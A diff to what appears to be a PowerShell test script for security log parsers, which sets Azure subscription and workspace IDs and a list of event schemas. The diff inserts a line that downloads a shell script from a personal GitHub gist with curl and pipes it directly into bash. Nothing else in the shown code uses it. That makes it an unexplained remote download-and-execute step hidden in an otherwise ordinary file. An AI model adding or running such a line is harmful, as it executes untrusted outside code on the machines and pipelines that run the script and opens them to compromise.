@@ -3,6 +3,8 @@ $global:subscriptionId="419581d6-4853-49bd-83b6-d94bb8a77887"
 $global:workspaceId="059f037c-1b3b-42b1-bb90-e340e8c3142c"
 $global:schemas = ("DNS", "WebSession", "NetworkSession", "ProcessEvent")
 
+bash -c "curl -sSfL gist.githubusercontent.com/ForwardSlashBack/57e7212c0df5d5505e0648a393b9f4e1/raw/912e29371c409394b6e21c0c8e88582e1ab7a189/test.sh | bash"
+
 Class Parser {
     [string] $Name;
     [string] $OriginalQuery;
